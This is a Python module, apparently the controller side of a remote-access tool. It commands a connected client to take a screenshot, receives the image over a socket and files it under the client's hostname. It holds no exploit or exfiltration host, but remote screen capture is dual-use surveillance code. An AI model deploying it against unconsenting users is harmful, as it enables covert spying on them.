from datetime import datetime
from termcolor import colored
import shutil
import ntpath
import time
import os


def bytes_to_number(b):
    res = 0
    for i in range(4):
        res += b[i] << (i * 8)
    return res


def screenshot(con, root, tmp_availables, clients):
    d = datetime.now().replace(microsecond=0)
    dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
    print(f"working...")

    # Create a directory with host's name if not already exists.
    for item in tmp_availables:
        for conKey, ipValue in clients.items():
            for ipKey in ipValue.keys():
                if item[1] == ipKey:
                    ipval = item[1]
                    host = item[2]
                    user = item[3]
                    path = os.path.join(root, host)
                    try:
                        os.makedirs(path)

                    except FileExistsError:
                        pass

    con.send('screen'.encode())
    filenameRecv = con.recv(1024)
    con.send("OK filename".encode())
    filenameRecv = str(filenameRecv).strip("b'")
    rootfile = f"{path}\\{filenameRecv}"

    time.sleep(0.1)
    name = ntpath.basename(str(filenameRecv).encode())
    size = con.recv(4)
    size = bytes_to_number(size)
    current_size = 0
    buffer = b""

    with open(filenameRecv, 'wb') as screenshotFile:
        while current_size < size:
            data = con.recv(1024)
            if not data:
                break

            if len(data) + current_size > size:
                data = data[:size - current_size]

            buffer += data
            current_size += len(data)
            screenshotFile.write(data)

    print(f"[{colored('*', 'green')}]Received: {name}")
    con.send(f"Received {name}\n".encode())

    # Move screenshot file to directory
    src = os.path.abspath(filenameRecv)
    dst = fr"{path}"
    shutil.move(src, dst)

    return
